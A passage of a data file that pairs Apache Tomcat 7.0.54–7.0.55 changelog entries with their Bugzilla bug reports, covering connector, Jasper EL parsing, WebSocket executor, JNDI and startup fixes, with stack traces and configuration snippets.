	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:992)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:655)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:222)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1565)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1522)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
]]]

The issue is that logging is invoked at
org.apache.coyote.http11.Http11NioProcessor.handleIncompleteRequestLineRead(Http11NioProcessor.java:240)

As that time Tomcat runs a keep-alive loop, and the loop is interrupted because connector is paused.

Expected behaviour
-------------------
1. If none characters from the request line have been read, then do not log anything. There was no request coming.
2. If some characters from the request line have been read, then create an access log entry, but one must call req.setStartTime() to initialize the tine value.

In ""2."" the request line will be truncated, but there might be some (though small) worth in logging it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56620
Coyote|Tomcat 7.0.55 (violetagg)|add||Fix CVE-2014-0230: Add a new limit, defaulting to 2MB, for the amount of data Tomcat will swallow for an aborted upload. The limit is configurable by maxSwallowSize attribute of an HTTP connector. (markt)|||
Coyote|Tomcat 7.0.55 (violetagg)|update||Allow to configure maxSwallowSize attribute of an HTTP connector via JMX. (kkolinko)|||
Coyote|Tomcat 7.0.55 (violetagg)|fix|56661|Fix getLocalAddr() for AJP connectors. The complete fix is only available with a recent AJP forwarder like the forthcoming mod_jk 1.2.41. (rjung)|ServletRequest#getLocalAddr() returns the hostname, not the IP address|"request.getLocalAddr() does not return an IP-address, but the host name from the http header. 

Accessing http://127.0.0.1:8080/ will make getLocalAddr() return 127.0.0.1
Accessing http://localhost:8080/ will make getLocalAddr() return localhost
Accessing http://localhost/ using mod_jk/ajp13 will also make getLocalAddr() return localhost

I see this on java7 using MacOS and FreeBSD."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56661
Coyote|Tomcat 7.0.55 (violetagg)|fix|59451|Correct Javadoc for MessageBytes. Patch provided by Kyohei Nakamura. (markt)|Incorrect the Javadoc in org.apache.tomcat.util.buf.MessageBytes|"Created attachment 33834 [details]
patch against trunk

The Javadoc of T_BYTES field and T_CHARS field in org.apache.tomcat.util.buf.MessageBytes are incorrect."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59451
Jasper|Tomcat 7.0.55 (violetagg)|fix||56334#c15: Fix a regression in EL parsing when quoted string follows a whitespace. (kkolinko/markt)|Double Backslash Escaping in Attributes|"Created attachment 31462 [details]
WAR file to reproduce exception

EL expressions in jspx-files are Java-String-backslash-decoded twice when they're part of static template text. They're even decoded twice when they're part of certain JSP-Tag attributes, but they're only decoded once during processing when part of a JSTL tag attribute:

<!-- Works as expected yielding \?resize as value of asd -->
<c:set var=""asd"" value=""${'\\?resize'}"" />

<!-- Won't work, but should -->
<set data-value=""${'\\?resize'}"" />

<!-- dito -->
<jsp:element name=""${'\\?resize'}""></jsp:element>

<!-- Works, but yields actually invalid results -->
<set data-value=""${'\\\\?resize'}"" />

During JSP compiling the following exception is thrown (taken from Tomcat log):

Apr 01, 2014 10:51:31 AM org.apache.catalina.core.StandardWrapperValve invoke
Schwerwiegend: Servlet.service() for servlet [jsp] in context with path [/tomcat_test] threw exception [/index.jspx (line: 12, column: 37) ""${'\\?resize'}"" contains invalid expression(s): javax.el.ELException: Failed to parse the expression [${'\?resize'}]] with root cause
org.apache.jasper.JasperException: /index.jspx (line: 12, column: 37) ""${'\\?resize'}"" contains invalid expression(s): javax.el.ELException: Failed to parse the expression [${'\?resize'}]
	at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:42)
	at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:443)
	at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:199)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.getJspAttribute(Validator.java:1399)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:772)
	at org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:529)
	at org.apache.jasper.compiler.Node$JspRoot.accept(Node.java:564)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2433)
	at org.apache.jasper.compiler.Node$Root.accept(Node.java:474)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Validator.validateExDirectives(Validator.java:1817)
	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:217)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340) [...]

As you can see the \\ get processed to \ between the output of the line information and the actual EL parsing.

In tomcat 7.0.27 the above examples work and produce the correct output."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56334#c15
Jasper|Tomcat 7.0.55 (violetagg)|fix|56543|Update to the Eclipse JDT Compiler 4.4. (violetagg)|Jasper fails to compile JSP pages when running with JDK 1.8|"Created attachment 31636 [details]
Failing minimal webapp

Taking an existing Tomcat/webapp installation and running with JDK 1.8 leads to compile errors with Jasper.

It seems due to Eclipse defect 390889  https://bugs.eclipse.org/bugs/show_bug.cgi?id=390889

Attached is a reduced webapp which works fine when run with JDK 1.6 or 1.7 but fails with 1.8.

(First reported at https://issues.apache.org/bugzilla/show_bug.cgi?id=56283)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56543
Jasper|Tomcat 7.0.55 (violetagg)|fix|56561|Avoid NoSuchElementException while handling attributes with empty string value. (violetagg)|NoSuchElementException on empty attribute in Validator$ValidateVisitor.getJspAttribute(Validator.java:1385)|"root cause
java.util.NoSuchElementException
	java.util.ArrayList$Itr.next(ArrayList.java:834)
	org.apache.jasper.compiler.Validator$ValidateVisitor.getJspAttribute(Validator.java:1385)
	org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:772)
	org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2377)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2429)
	org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:779)
	org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2377)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2429)
	org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:529)
	org.apache.jasper.compiler.Node$JspRoot.accept(Node.java:564)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2377)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2429)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2435)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:474)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2377)
	org.apache.jasper.compiler.Validator.validateExDirectives(Validator.java:1841)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:217)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:657)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
...

It fails on e.g. on the following line:
<body ui-view=""""></body>

These changes happened in bug 56334."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56561
Jasper|Tomcat 7.0.55 (violetagg)|update|56581|If an error on a JSP page occurs when response has already been committed, do not clear the buffer of JspWriter, but flush it. It will make more clear where the error occurred. (kkolinko)|When an error occurs on a long JSP page, do not loose last chunk of printed text|"Created attachment 31680 [details]
test.jsp

(Reproducible with the current trunk @1598763

If there is a JSP page that generates a lot of text and then encounters an error, the client receives only 8K*n bytes of text. The last chunk of text - before the actual place of the error is lost and not sent to the client.

To reproduce:
1. Deploy the attached test.jsp and call it.
2. Actual behaviour:
The last line of text is ""970 "".
If you save the result, it will be 16384 (16 Kb) (with LF line ends).

Expected behaviour:
The last line of text is ""1000 Hello world!"".

My motivation for this enhancement request is that seeing all the text before the error place would make it easier to locate the error.

Also the lost ~8K of text may contain something valuable for the client.

The current workaround is to look into localhost.date.log for the actual stack trace. The stacktrace is for generated java file. It may contain a JSP source snippet, but not always."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56581
Jasper|Tomcat 7.0.55 (violetagg)|fix|56612|Correctly parse two consecutive escaped single quotes when used in UEL expression in a JSP. (markt)|Jasper is not able to parse two consecutive escaped single quotes in EL|"JSP compiler breaks when it encounters two consecutive escaped single quotes in EL.

Example JSP:

    ${'\'\''}

Expected result:

    ''

Result:

    org.apache.jasper.JasperException: /test.jsp (line: 1, column: 3) Unterminated ${ tag
	org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:42)
	org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:276)
	org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:92)
	org.apache.jasper.compiler.Parser.parseELExpression(Parser.java:760)
	org.apache.jasper.compiler.Parser.parseElements(Parser.java:1473)
	org.apache.jasper.compiler.Parser.parse(Parser.java:139)
	org.apache.jasper.compiler.ParserController.doParse(ParserController.java:229)
	org.apache.jasper.compiler.ParserController.parse(ParserController.java:100)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:200)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:375)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:355)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:342)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:564)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:403)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:347)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:725)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)

Bug is also present in Tomcat 7.0.53."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56612
Jasper|Tomcat 7.0.55 (violetagg)|update||Move code that parses EL expressions within JSP template text from Parser to JspReader class for better performance. (kkolinko)|||
WebSocket|Tomcat 7.0.55 (violetagg)|fix|56577|Improve the executor configuration used for the callbacks associated with asynchronous writes. (markt)|[websocket] Inappropriate executor in WsServerContainer|"The executor service to process SendHandler for sendAsync calls is initialized in WsServerContainer, which is using an unbounded queue. 

Thus, no more than corePoolSize threads will ever be created. (And the value of the maximumPoolSize therefore doesn't have any effect.)  [1]

The corePoolSize has a default value to be 1, though it could be changed by context parameter, it's still hard to find an optimized value.

This will create an issue if using the SendHandler to close the session after sending the last message. An example stack trace is like the following:


""WebSocketServer-/spring-websocket-test-1"" daemon prio=10 tid=0x00007f9f040ec000 nid=0x7499 waiting on condition [0x00007f9f73af8000]
   java.lang.Thread.State: TIMED_WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x000000075d52f018> (a java.util.concurrent.CountDownLatch$Sync)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:1033)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1326)
        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:282)
        at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:93)
        at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:238)
        at org.apache.tomcat.websocket.WsSession.sendCloseMessage(WsSession.java:487)
        at org.apache.tomcat.websocket.WsSession.doClose(WsSession.java:418)
        - locked <0x000000075d7dc388> (a java.lang.Object)
        at org.apache.tomcat.websocket.WsSession.close(WsSession.java:395)
        at org.apache.tomcat.websocket.WsSession.close(WsSession.java:389)
        at com.tango.test.spring.test.service.DefaultSessionManager$CloseSessionHandler.onResult(DefaultSessionManager.java:133)
        at org.apache.tomcat.websocket.WsRemoteEndpointImplBase$StateUpdateSendHandler.onResult(WsRemoteEndpointImplBase.java:1083)
        at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.endMessage(WsRemoteEndpointImplBase.java:320)
        at org.apache.tomcat.websocket.WsRemoteEndpointImplBase$EndMessageHandler.onResult(WsRemoteEndpointImplBase.java:468)
        at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer$OnResultRunnable.run(WsRemoteEndpointImplServer.java:234)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:745)



If all the threads are in this state, there will be no available threads to clear any SendHandler and all Remote.send methods would throw TimeoutException though actually the clients could receive the messages.


[1] http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ThreadPoolExecutor.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56577
Web applications|Tomcat 7.0.55 (violetagg)|fix||Set the path for cookies created by the examples web application so they only returned to the examples application. This reduces the opportunity for using such cookies for malicious purposes should the advice to remove the examples web application from security sensitive systems be ignored. (markt/kkolinko)|||
Web applications|Tomcat 7.0.55 (violetagg)|fix||Attempt to obfuscate session cookie values associated with other web applications when viewing HTTP request headers with the Request Header example from the examples web application. This reduces the opportunity to use this example for malicious purposes should the advice to remove the examples web application from security sensitive systems be ignored. (markt)|||
Other|Tomcat 7.0.55 (violetagg)|update||Update optional Checkstyle library to 5.7. (kkolinko)|||
Other|Tomcat 7.0.55 (violetagg)|fix|56685|Add quotes necessary for daemon.sh to work correctly on Solaris. Based on a suggestion by lfuka. (markt)|Tomcat7 daemon.sh did not start|"When i run /opt/tomcat7/bin/daemon.sh start under tomcat user i got an error: /opt/tomcat7/bin/daemon.sh: test: argument expected

It happens on all Solaris platforms

There are missing quotes """" in if on lines 108 and 110.

It should be:
if [ -z ""$JSVC"" ]; then
    JSVC=""$CATALINA_BASE/bin/jsvc""
    if [ ! -x ""$JSVC"" ]; then
        JSVC=""$CATALINA_HOME/bin/jsvc""
    fi
fi

Solaris has problem without quotes.

Note: Its also bug in Tomcat8 daemon.sh"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56685
Other|Tomcat 7.0.55 (violetagg)|update|56596|Update to Tomcat Native Library version 1.1.31 to pick up the Windows binaries that are based on OpenSSL 1.0.1h. (markt)|OpenSSL 1.0.1g is vulnerable to a man-in-the-middle attack|"Open SSL has issued a security advisory against a man-in -the-middle attack vulnerability and recommends to upgrade to open ssl version 1.0.1h
The latest Tomcat native library was build using openssl 1.0.1g.

Please create a new build with the latest open SSL version 1.0.1h to mitigate this vulnerability in tomcat native library. 

The following links describe the vulnerability - 
https://www.us-cert.gov/ncas/current-activity/2014/06/05/OpenSSL-Releases-Security-Advisory
http://www.openssl.org/news/secadv_20140605.txt
http://www.kb.cert.org/vuls/id/978508"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56596
Catalina|Tomcat 7.0.54 (violetagg)|fix||Fix custom UTF-8 decoder so that a byte of value 0xC1 is always rejected immediately as it is never valid in a UTF-8 byte sequence. Update UTF-8 decoder tests to account for UTF-8 decoding improvements in Java 8. The custom UTF-8 decoder is still required due to bugs in the UTF-8 decoder provided by Java. Java 8's decoder is better than Java 7's but it is still buggy. (markt)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix|56027|Add more options for managing FIPS mode in the AprLifecycleListener. (schultz/kkolinko)|Unable to use TCN on RHEL6 boxes if box is booted in fips mode|"There are two problems here.

#1) A RHEL6 box can be configured to boot in FIPS 140 mode automatically, and the underlying openssl packages will detect this when they initialize.  If Tomcat is configured to use the APR listener with 'FIPSMode=""on""' set, then the APRLifecycleListener in initializeSSL calls down to TCN to explicitly do a fipsModeSet.  However, *if* a RHEL box is configured to be in fips mode at boot then this call will fail in the openssl libraries, where it claims that fips mode is already set. Looking at the openssl source (openssl-1.0.0-27.el6.src.rpm) the FIPS_mode_set() call does not allow for being 'set' more than once.  Putting a check in TCN src/ssl.c in the fipsModeCheck() to see if the mode is already set solves this one.

#2) Second issue is in the SSL_TMP_KEYS_INIT macro (called from the TCN src/ssl.c initialize() method) looks like it trying to pre-initialize a 512 bit RSA key.  This key appears to be invalid (the underlying ssl_tmp_key_init_rsa() call fails), and this winds up with the entire initialize code throwoing an error about this platform having an unsupported function and exiting.  Deleting the 512 RSA init line solves this one.

Not sure the best solution for #2.  Discussing with a few folks here indicated that a 512 bit RSA key is invalid for FIPS mode, so perhaps this call needs to be wrapped in a 'if (FIPS_Mode()==0)' check.  Out of my depth there on the best solution.

My initial debug wound up exposing the FIPS_Mode() call thru JNI so the AprLifecycleListner class could check this and display an intelligent message, but this would involve changes to both TC6/7(/8?) as well as TCN, and may not be worth that extra involvement."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56027
Catalina|Tomcat 7.0.54 (violetagg)|fix|56321|When a WAR is modified, undeploy the web application before deleting any expanded directory as the undeploy process may refer to classes that need to be loaded from the expanded directory. If the expanded directory is deleted first, any attempt to load a new class during undeploy will fail. (markt)|ServletContextListener.contextDestroyed not completely executed when updating war|"When the contextDestroyed accesses a static method on a class which has not been loaded yet, the rest of the contextDestroyed code is not executed,e.g.,:

package contexttest;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;

public class ContextTest implements ServletContextListener {

	public void contextDestroyed(ServletContextEvent arg0) {
		System.out.println(""Context Destroyed"");
		MyTest.testStatic();
		System.out.println(""Context Destroyed Done"");
		
	}

	public void contextInitialized(ServletContextEvent arg0) {
		System.out.println(""Context Initialized"");
	}

}

package contexttest;

public class MyTest {

	public static void testStatic(){
		System.out.println(""My static method call"");
	}
}

When I created a war based on this code, and copy this war to the tomcat web apps directory, it logs 'Context Initialized' as expected.

When I remove the war it logs:
Context Destroyed
My static method call
Context Destroyed Done

as expected. However when I copy the war to web apps, wait till it is initialized, and then touch the war (to simulate the update of a the war). It logs for the destroy event only:

'Context Destroyed'

So the static method call and the 'Context Destroyed Done' is missing. 

When I execute the above on tomcat 7.0.42 it behaves as I would expect, so no difference between removing a war or updating the war."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56321
Catalina|Tomcat 7.0.54 (violetagg)|fix|56339|Avoid an infinite loop if an application calls session.invalidate() from the session destroyed event for that session. (markt)|session listener invalidate session|"we have sessionlistener
in sessionDestroyed method we call session.invalidate()
in version 7.0.42 its ok but newer versions loops code

public void sessionDestroyed(HttpSessionEvent arg0) {
		if(arg0 !=null && arg0.getSession() !=null)
		{
			HttpSession session = arg0.getSession();
			String sessionId = session.getId();
			if(sessionId != null)
			{
				UserPrincipal userPrincipal = (UserPrincipal)session.getAttribute(ContextVar.USERPRINCIPLE);
				if (userPrincipal != null)
				{
					UserOpBLO userOpBLO = new UserOpBLO(new ResourcePool());
					userOpBLO.processLogoutActivity(sessionId, userPrincipal.getUserId());
					CurrentSessions.SESSIONS.remove(sessionId);
					session.invalidate();
				}
			}
		}
	}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56339
Catalina|Tomcat 7.0.54 (violetagg)|update|56365|Simplify file name pattern matching code in StandardJarScanner. Ignore leading and trailing whitespace and empty strings when configuring patterns. Improve documentation. (kkolinko)|Simplify use of Mapper in StandardJarScanner|"Looking at the code that performs jar names filtering in StandardJarScanner in 8.0.5, 7.0.53.

This is in view of
a) backporting it to Tomcat 6 to get rid of ecj-xxx.jar names in the lists of ignored files there,
b) documenting what filename patterns are supported here.

Essentially, the code calls ""Matcher.matchPath(toSkip, jarName)"" (see StandardJarScanFilter#check() in 8.0.5) where jarName is just a file name.

This is an overkill. The matchPath() method is designed to work with Ant-style patterns matching against file paths. This method handles file names hierarchy (directory names and ""**"" directory name pattern).  The actual matching of the names is performed by Matcher.match(String pattern, String str, boolean caseSensitive), which is a rather more simple API.

Thus the proposal is to get rid of Matcher.matchPath() and call Matcher.match() directly. This allows to remove a lot of unneeded code.

For documentation, the file name patterns supported by Matcher.match() according to its javadoc are as follows:
 * The pattern may contain two special characters:<br>
 * '*' means zero or more characters<br>
 * '?' means one and only one character"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56365
Catalina|Tomcat 7.0.54 (violetagg)|fix|56369|Ensure that removing an MBean notification listener reverts all the operations performed when adding an MBean notification listener. (markt)|BaseModelMBean does not clean-up attributeBroadcaster in removeNotificationListener()|"BaseModelMBean.addNotificationListener() registers the listener on attributeBroadcaster, while BaseModelMBean.removeNotificationListener() fails to clean that up.

The end result is a memory leak that is very apparent when you embed directly in your WAR file jmxremote_optional.jar as the com.sun.jmx.remote.opt.internal.ArrayNotificationBuffer$BufferListener' classloader cannot be garbage collected which end up depleting the perm gen merely after a few redeploys."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56369
Catalina|Tomcat 7.0.54 (violetagg)|add|56382|Information about finished deployment and its execution time is added to the log files. Patch is provided by Danila Galimov. (violetagg)|Add logging of deployment time|"Tomcat logs the start of the deployment directory, but doesn't log finish.
I've created the small patch, which logs when the particular deployment is finished, with the deployment time.

So output will be like this:

Apr 10, 2014 4:26:17 PM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\AAA\Tools\apache-tomcat-7.0.52\webapps\aaa-admin

....

Apr 10, 2014 4:31:10 PM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deployment of web application directory C:\AAA\Tools\apache-tomcat-7.0.52\webapps\aaa-admin has finished in 292,516 ms."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56382
Catalina|Tomcat 7.0.54 (violetagg)|add|56383|Properties for disabling server information and error report are added to the org.apache.catalina.valves.ErrorReportValve. Based on the patch provided by Nick Bunn. (violetagg/kkolinko)|Securing ErrorReportValve [PATCH]|"Created attachment 31507 [details]
Patch for ErrorReportValve

When the default error valve returns its report it publishes the tomcat version and some other troubleshooting data. This of course breaks security standards at some companies and also is published as a item that needs to be remediated when hardening tomcat(OWASP - goo.gl/Zr9xso ). When using the OWASP solution of replacing the serverInfo.properties file it can and will break tools/code that uses that information. 

Attached is the proposed enhancement to be able switch options to show minimal information back.

By adding the below will only return a html page with only the status. No CSS or title
<Valve className=""org.apache.catalina.valves.ErrorReportValve"" showReport=""false"" showServerInfo=""false"" />

Currently, default is true for both so if users still want to see the current report nothing will have to change in there server.xml"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56383
Catalina|Tomcat 7.0.54 (violetagg)|fix||Fix CVE-2014-0119: Only create XML parsing objects if required and fix associated potential memory leak in the default Servlet. Extend XML factory, parser etc. memory leak protection to cover some additional locations where, theoretically, a memory leak could occur. Ensure that a TLD parser obtained from the cache has the correct value of blockExternal. (markt)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix||Modify generic exception handling so that StackOverflowError is not treated as a fatal error and can handled and/or logged as required. (markt)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix|56409|Avoid StackOverflowError on non-Windows systems if a file named \ is encountered when scanning for TLDs. (markt)|"A file called ""\"" causes StackOverflowError in tldScanResourcePaths during startup"|"at org.apache.catalina.startup.TldConfig.tldScanResourcePaths(TldConfig.java:366)
at org.apache.catalina.startup.TldConfig.tldScanResourcePaths(TldConfig.java:398)
at org.apache.catalina.startup.TldConfig.tldScanResourcePaths(TldConfig.java:398)
at org.apache.catalina.startup.TldConfig.tldScanResourcePaths(TldConfig.java:398)
at org.apache.catalina.startup.TldConfig.tldScanResourcePaths(TldConfig.java:398)
(... repeats a lot of times)

Steps to reproduce:
1) Create a file named ""\"" below WEB-INF in an own folder
2) Start Tomcat7"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56409
Catalina|Tomcat 7.0.54 (violetagg)|add|56430|Extend checks for suspicious URL patterns to include patterns of the form *.a.b which are not valid patterns for extension mappings. (markt)|Extension mapping that includes a dot in the extension does not work|"Chapter SRV.11.2 of the servlet specification defines...

    A string beginning with a '*.' prefix is used as an extension mapping.

http://download.oracle.com/otndocs/jcp/servlet-2.5-mrel2-eval-oth-JSpec/

So, this tells us, the url-pattern '*.jsp' forwards all requests ending with '.jsp' to the mapped servlet or filtes. With this, one might also assume that the url-pattern '*.my.txt' forwards all requests ending with 'my.txt' to the configured servlet or filters. But the latter does not work with Tomcat.

I set up a tiny maven project, for illustrating the problem: https://bitbucket.org/benplocek/servlet-extension-mapping-test

This project contains a Servlet and a Filter, both mapped to '.my.html':

  <servlet-mapping>
    <servlet-name>MyServlet</servlet-name>
    <url-pattern>*.my.html</url-pattern>
  </servlet-mapping>

When sending a request to /test.my.html Tomcat responds with a 404.

I also deployed this app to Jetty 9.1.4 which behaves as expected: /test.my.html invokes the filter and also serves the servlet. Because of this I assume this is a bug in Tomcat.

Note: Also applies to Tomcat 8.0.5."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56430
Catalina|Tomcat 7.0.54 (violetagg)|fix|56441|Raise the visibility of exceptions thrown when a problem is encountered calling a getter or setter on a component attribute. The logging level is raised from debug to warning. (markt)|Misleading error message in FilterBase cause by invalid regex|"An invalid regex in the allow parameter leads to raising of a misleading exception: The property ""allow"" is not defined for filters of type ""org.apache.catalina.filters.RemoteAddrFilter"".


Test config in web.xml

  <filter>
     <filter-name>TestFilter</filter-name>
     <filter-class>org.apache.catalina.filters.RemoteAddrFilter</filter-class>
     <init-param>
        <param-name>allow</param-name>
        <param-value>127\.0\.\0.1</param-value>
     </init-param>
  </filter>

  <filter-mapping>
     <filter-name>TestFilter</filter-name> 
     <url-pattern>*</url-pattern> 
  </filter-mapping>


Apr 22, 2014 3:50:10 PM org.apache.catalina.core.StandardContext filterStart
SEVERE: Exception starting filter TestFilter
javax.servlet.ServletException: The property ""allow"" is not defined for filters of type ""org.apache.catalina.filters.RemoteAddrFilter""
        at org.apache.catalina.filters.FilterBase.init(FilterBase.java:53)
        at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:269)
        at org.apache.catalina.core.ApplicationFilterConfig.getFilter(ApplicationFilterConfig.java:258)
        at org.apache.catalina.core.ApplicationFilterConfig.setFilterDef(ApplicationFilterConfig.java:382)
        at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:103)
        at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4650)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5306)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
        at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
        at java.util.concurrent.FutureTask.run(FutureTask.java:166)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56441
Catalina|Tomcat 7.0.54 (violetagg)|fix|56451|Make resources accessed via a context alias accessible via JNDI in the same way standard resources are available. (markt)|JNDI lookups under java:comp/Resources do not access <Context aliases> resources|"1. Using JNDI lookup to access resources

Given a resource accessible as

request.getServletContext().getResourceAsStream(""/some/path/myResource"");

it can also be accessed via JNDI (return type is different but equally useful)

ic.lookup(""java:comp/Resources/some/path/myResource"")


2. JNDI lookups ignores aliased resources

Given a <Context aliases=""/someAlias=/any/path"" .../>, its resources are accessible

request.getServletContext().getResourceAsStream(""/someAlias/myOtherResource"");

BUT, the lookup 

ic.lookup(""java:comp/Resources/someAlias/myOtherResource"")
 
fails throwing org.apache.naming.resources.ImmutableNameNotFoundException.

Listing the java:comp/Resources context shows someAlias is NOT bound.

3. Expected behavior

Tomcat exposes resources under the java:comp/Resources JNDI context. Aliases should also apply to this alternate access interface."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56451
Catalina|Tomcat 7.0.54 (violetagg)|add|56463|Property for disabling server information is added to the DefaultServlet. Server information is presented in the response sent to the client when directory listings is enabled. (violetagg)|Allow to disable ServerInfo in directory listings in DefaultServlet|"Discussion on dev@:
http://tomcat.markmail.org/thread/mh3yaptw7rlw2zcv

[quote]
Looking at Tomcat bug 56383 - ""Securing ErrorReportValve"" (
https://issues.apache.org/bugzilla/show_bug.cgi?id=56383 ), i think a
similar thing can also be done for the Tomcat version number reported by
the DefaultServlet.
This servlet will show the version information from ServerInfo when the
listings are enabled. Currently it seems there is no way of disabling
